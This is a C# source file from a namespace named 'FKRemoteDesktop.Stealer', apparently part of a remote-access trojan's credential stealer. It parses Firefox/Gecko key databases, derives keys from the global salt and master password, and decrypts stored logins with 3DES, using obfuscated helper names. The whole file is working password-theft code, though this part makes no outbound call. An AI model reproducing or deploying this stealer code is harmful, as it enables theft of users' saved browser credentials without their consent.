using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer.Helper
{
    public class GeckoCore
    {
        public static readonly byte[] Key4MagicNumber = new byte[16] { 248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };

        public enum EGeckoObjectType
        {
            eGeckoObjectType_Sequence = 48,
            eGeckoObjectType_Integer = 2,
            eGeckoObjectType_BitString = 3,
            eGeckoObjectType_OctetString = 4,
            eGeckoObjectType_Null = 5,
            eGeckoObjectType_ObjectIdentifier = 6
        }

        public int nextId { get; set; }
        public GeckoLoginInfo[] logins { get; set; }
        public object[] disabledHosts { get; set; }
        public int version { get; set; }

        public class GeckoInfo
        {
            public EGeckoObjectType ObjectType { get; set; }
            public byte[] ObjectData { get; set; }
            public int ObjectLength { get; set; }
            public List<GeckoInfo> Objects { get; set; }

            public GeckoInfo()
            {
                Objects = new List<GeckoInfo>();
            }

            public override string ToString()
            {
                StringBuilder stringBuilder = new StringBuilder();
                StringBuilder stringBuilder2 = new StringBuilder();
                switch (ObjectType)
                {
                    case EGeckoObjectType.eGeckoObjectType_Sequence:
                        stringBuilder.AppendLine("SEQUENCE {");
                        break;

                    case EGeckoObjectType.eGeckoObjectType_Integer:
                        {
                            byte[] objectData = ObjectData;
                            foreach (byte b2 in objectData)
                            {
                                stringBuilder2.AppendFormat("{0:X2}", b2);
                            }
                            stringBuilder.Append("\tINTEGER ").Append(stringBuilder2).AppendLine();
                            break;
                        }
                    case EGeckoObjectType.eGeckoObjectType_OctetString:
                        {
                            byte[] objectData = ObjectData;
                            foreach (byte b3 in objectData)
                            {
                                stringBuilder2.AppendFormat("{0:X2}", b3);
                            }
                            stringBuilder.Append("\tOCTETSTRING ").AppendLine(stringBuilder2.ToString());
                            break;
                        }
                    case EGeckoObjectType.eGeckoObjectType_ObjectIdentifier:
                        {
                            byte[] objectData = ObjectData;
                            foreach (byte b in objectData)
                            {
                                stringBuilder2.AppendFormat("{0:X2}", b);
                            }
                            stringBuilder.Append("\tOBJECTIDENTIFIER ").AppendLine(stringBuilder2.ToString());
                            break;
                        }
                }
                foreach (GeckoInfo @object in Objects)
                {
                    stringBuilder.Append(@object.ToString());
                }
                if (ObjectType == EGeckoObjectType.eGeckoObjectType_Sequence)
                {
                    stringBuilder.AppendLine("}");
                }
                stringBuilder2.Remove(0, stringBuilder2.Length - 1);
                return stringBuilder.ToString();
            }
        }

        public class GeckoCryptographyInfo  // Gecko7
        {
            public string EntrySalt { get; set; }
            public string OID { get; set; }
            public string Passwordcheck { get; set; }

            public GeckoCryptographyInfo(string DataToParse)
            {
                int num = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
                this.EntrySalt = DataToParse.Substring(6, num);
                int num2 = DataToParse.Length - (6 + num + 36);
                this.OID = DataToParse.Substring(6 + num + 36, num2);
                this.Passwordcheck = DataToParse.Substring(6 + num + 4 + num2);
            }
        }

        public class GeckoAESInfo   // Gecko8
        {
            public byte[] _globalSalt { get; set; }
            public byte[] _masterPassword { get; set; }
            public byte[] _entrySalt { get; set; }
            public byte[] DataKey { get; set; }
            public byte[] DataIV { get; set; }

            public GeckoAESInfo(byte[] salt, byte[] password, byte[] entry)
            {
                _globalSalt = salt;
                _masterPassword = password;
                _entrySalt = entry;
            }

            public void Crypto()
            {
                SHA1CryptoServiceProvider sHA1CryptoServiceProvider = new SHA1CryptoServiceProvider();
                byte[] array = new byte[_globalSalt.Length + _masterPassword.Length];
                Array.Copy(_globalSalt, 0, array, 0, _globalSalt.Length);
                Array.Copy(_masterPassword, 0, array, _globalSalt.Length, _masterPassword.Length);
                byte[] array2 = sHA1CryptoServiceProvider.ComputeHash(array);
                byte[] array3 = new byte[array2.Length + _entrySalt.Length];
                Array.Copy(array2, 0, array3, 0, array2.Length);
                Array.Copy(_entrySalt, 0, array3, array2.Length, _entrySalt.Length);
                byte[] key = sHA1CryptoServiceProvider.ComputeHash(array3);
                byte[] array4 = new byte[20];
                Array.Copy(_entrySalt, 0, array4, 0, _entrySalt.Length);
                for (int i = _entrySalt.Length; i < 20; i++)
                {
                    array4[i] = 0;
                }
                byte[] array5 = new byte[array4.Length + _entrySalt.Length];
                Array.Copy(array4, 0, array5, 0, array4.Length);
                Array.Copy(_entrySalt, 0, array5, array4.Length, _entrySalt.Length);
                byte[] array6;
                byte[] array9;
                using (HMACSHA1 hMACSHA = new HMACSHA1(key))
                {
                    array6 = hMACSHA.ComputeHash(array5);
                    byte[] array7 = hMACSHA.ComputeHash(array4);
                    byte[] array8 = new byte[array7.Length + _entrySalt.Length];
                    Array.Copy(array7, 0, array8, 0, array7.Length);
                    Array.Copy(_entrySalt, 0, array8, array7.Length, _entrySalt.Length);
                    array9 = hMACSHA.ComputeHash(array8);
                }
                byte[] array10 = new byte[array6.Length + array9.Length];
                Array.Copy(array6, 0, array10, 0, array6.Length);
                Array.Copy(array9, 0, array10, array6.Length, array9.Length);
                DataKey = new byte[24];
                for (int j = 0; j < DataKey.Length; j++)
                {
                    DataKey[j] = array10[j];
                }
                DataIV = new byte[8];
                int num = DataIV.Length - 1;
                for (int num2 = array10.Length - 1; num2 >= array10.Length - DataIV.Length; num2--)
                {
                    DataIV[num] = array10[num2];
                    num--;
                }
            }
        }

        public class GeckoDBInfo    // Gecko9
        {
            public string Version { get; set; }
            public List<KeyValuePair<string, string>> Keys { get; set; }

            public GeckoDBInfo(string FileName)
            {
                List<byte> list = new List<byte>();
                Keys = new List<KeyValuePair<string, string>>();
                using (BinaryReader binaryReader = new BinaryReader(File.OpenRead(FileName)))
                {
                    int i = 0;
                    for (int num = (int)binaryReader.BaseStream.Length; i < num; i++)
                    {
                        list.Add(binaryReader.ReadByte());
                    }
                }
                string value = BitConverter.ToString(Txtnhfrn(list.ToArray(), 0, 4, littleEndian: false)).Replace("-", "");
                string text = BitConverter.ToString(Txtnhfrn(list.ToArray(), 4, 4, littleEndian: false)).Replace("-", "");
                int num2 = BitConverter.ToInt32(Txtnhfrn(list.ToArray(), 12, 4, littleEndian: true), 0);
                if (!string.IsNullOrEmpty(value))
                {
                    Version = "Berkelet DB";
                    if (text.Equals("00000002"))
                    {
                        Version += " 1.85 (Hash, version 2, native byte-order)";
                    }
                    int num3 = int.Parse(BitConverter.ToString(Txtnhfrn(list.ToArray(), 56, 4, littleEndian: false)).Replace("-", ""));
                    int num4 = 1;
                    while (Keys.Count < num3)
                    {
                        string[] array = new string[(num3 - Keys.Count) * 2];
                        for (int j = 0; j < (num3 - Keys.Count) * 2; j++)
                        {
                            array[j] = BitConverter.ToString(Txtnhfrn(list.ToArray(), num2 * num4 + 2 + j * 2, 2, littleEndian: true)).Replace("-", "");
                        }
                        Array.Sort(array);
                        for (int k = 0; k < array.Length; k += 2)
                        {
                            int num5 = Convert.ToInt32(array[k], 16) + num2 * num4;
                            int num6 = Convert.ToInt32(array[k + 1], 16) + num2 * num4;
                            int num7 = (k + 2 >= array.Length) ? (num2 + num2 * num4) : (Convert.ToInt32(array[k + 2], 16) + num2 * num4);
                            string @string = Encoding.ASCII.GetString(Txtnhfrn(list.ToArray(), num6, num7 - num6, littleEndian: false));
                            string value2 = BitConverter.ToString(Txtnhfrn(list.ToArray(), num5, num6 - num5, littleEndian: false));
                            if (!string.IsNullOrEmpty(@string))
                            {
                                Keys.Add(new KeyValuePair<string, string>(@string, value2));
                            }
                        }
                        num4++;
                    }
                }
                else
                {
                    Version = "无效的DB格式";
                }
            }

            private byte[] Txtnhfrn(byte[] source, int start, int length, bool littleEndian)
            {
                byte[] array = new byte[length];
                int num = 0;
                for (int i = start; i < start + length; i++)
                {
                    array[num] = source[i];
                    num++;
                }
                if (littleEndian)
                {
                    Array.Reverse(array);
                }
                return array;
            }
        }

        public class GeckoLoginInfo // Gecko5
        {
            public int id { get; set; }
            public string hostname { get; set; }
            public object httpRealm { get; set; }
            public string formSubmitURL { get; set; }
            public string usernameField { get; set; }
            public string passwordField { get; set; }
            public string encryptedUsername { get; set; }
            public string encryptedPassword { get; set; }
            public string guid { get; set; }
            public int encType { get; set; }
            public long timeCreated { get; set; }
            public long timeLastUsed { get; set; }
            public long timePasswordChanged { get; set; }
            public int timesUsed { get; set; }
        }

        public static string lTRjlt(byte[] key, byte[] iv, byte[] input, PaddingMode paddingMode = PaddingMode.None)
        {
            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                tripleDESCryptoServiceProvider.Key = key;
                tripleDESCryptoServiceProvider.IV = iv;
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
                tripleDESCryptoServiceProvider.Padding = paddingMode;
                using (ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor(key, iv))
                {
                    return Encoding.Default.GetString(cryptoTransform.TransformFinalBlock(input, 0, input.Length));
                }
            }
        }

        public static GeckoInfo Create(byte[] dataToParse)
        {
            GeckoInfo geckoInfo = new GeckoInfo();
            for (int i = 0; i < dataToParse.Length; i++)
            {
                EGeckoObjectType objectType = (EGeckoObjectType)dataToParse[i];
                int num = 0;
                switch (objectType)
                {
                    case EGeckoObjectType.eGeckoObjectType_Sequence:
                        {
                            byte[] array;
                            if (geckoInfo.ObjectLength == 0)
                            {
                                geckoInfo.ObjectType = EGeckoObjectType.eGeckoObjectType_Sequence;
                                geckoInfo.ObjectLength = dataToParse.Length - (i + 2);
                                array = new byte[geckoInfo.ObjectLength];
                            }
                            else
                            {
                                geckoInfo.Objects.Add(new GeckoInfo
                                {
                                    ObjectType = EGeckoObjectType.eGeckoObjectType_Sequence,
                                    ObjectLength = dataToParse[i + 1]
                                });
                                array = new byte[dataToParse[i + 1]];
                            }
                            num = ((array.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array.Length);
                            Array.Copy(dataToParse, i + 2, array, 0, array.Length);
                            geckoInfo.Objects.Add(Create(array));
                            i = i + 1 + dataToParse[i + 1];
                            break;
                        }
                    case EGeckoObjectType.eGeckoObjectType_Integer:
                        {
                            geckoInfo.Objects.Add(new GeckoInfo
                            {
                                ObjectType = EGeckoObjectType.eGeckoObjectType_Integer,
                                ObjectLength = dataToParse[i + 1]
                            });
                            byte[] array = new byte[dataToParse[i + 1]];
                            num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
                            Array.Copy(dataToParse, i + 2, array, 0, num);
                            geckoInfo.Objects[geckoInfo.Objects.Count - 1].ObjectData = array;
                            i = i + 1 + geckoInfo.Objects[geckoInfo.Objects.Count - 1].ObjectLength;
                            break;
                        }
                    case EGeckoObjectType.eGeckoObjectType_OctetString:
                        {
                            geckoInfo.Objects.Add(new GeckoInfo
                            {
                                ObjectType = EGeckoObjectType.eGeckoObjectType_OctetString,
                                ObjectLength = dataToParse[i + 1]
                            });
                            byte[] array = new byte[dataToParse[i + 1]];
                            num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
                            Array.Copy(dataToParse, i + 2, array, 0, num);
                            geckoInfo.Objects[geckoInfo.Objects.Count - 1].ObjectData = array;
                            i = i + 1 + geckoInfo.Objects[geckoInfo.Objects.Count - 1].ObjectLength;
                            break;
                        }
                    case EGeckoObjectType.eGeckoObjectType_ObjectIdentifier:
                        {
                            geckoInfo.Objects.Add(new GeckoInfo
                            {
                                ObjectType = EGeckoObjectType.eGeckoObjectType_ObjectIdentifier,
                                ObjectLength = dataToParse[i + 1]
                            });
                            byte[] array = new byte[dataToParse[i + 1]];
                            num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
                            Array.Copy(dataToParse, i + 2, array, 0, num);
                            geckoInfo.Objects[geckoInfo.Objects.Count - 1].ObjectData = array;
                            i = i + 1 + geckoInfo.Objects[geckoInfo.Objects.Count - 1].ObjectLength;
                            break;
                        }
                }
            }
            return geckoInfo;
        }
    }
}